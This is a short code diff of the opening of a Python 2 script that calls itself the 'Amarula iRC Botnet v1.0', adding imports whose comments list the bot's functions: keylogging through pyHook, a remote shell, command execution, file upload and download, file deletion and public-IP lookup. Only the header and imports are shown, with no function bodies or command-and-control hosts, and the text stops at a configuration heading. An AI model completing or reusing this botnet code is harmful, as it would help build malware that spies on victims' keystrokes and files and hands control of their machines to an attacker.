@@ -1,8 +1,9 @@
-z#!/usr/bin/python
+#!/usr/bin/python
 # -*-coding:utf-8-*-
 # coder: _carlosnericorreia_(badfly)
 # email: hackerama@protonmail.com
 # Amarula iRC Botnet v1.0 - Abacatch Version
+
 
 #######################################################################################################################
 #                                                                                                                     #
@@ -10,6 +11,21 @@ z#!/usr/bin/python
 #                                                  Abacatch Version                                                   #
 #                                                                                                                     #
 #######################################################################################################################
+
+import glob                                       # Funcao listArq()
+import os                                         # Funcoes deleteFile(), listArq(), upload(),
+import platform                                   # Variavel pcName
+import pyHook, pythoncom                          # Funcoes keylog(), onKey(event)
+import random                                     # Variavel pcName
+import requests                                   # Funcao upload()
+import re                                         # Funcao getPublicIp()
+import socket                                     # Funcoes  conn(), ipLocal()
+import subprocess                                 # Funcao run()
+import sys                                        # Opcao matar
+from urllib import urlopen                        # Funcao getPublicIp()
+import urllib,urllib2                             # Funcao download()
+import time                                       # Funcoes listArq(), shell(), main()
+import threading                                  # Funcao onKey(event)
 
 # --------------------------------------------------------------------------------------------------------------------#
 #                                              C O N F I G U R A C O E S                                              #
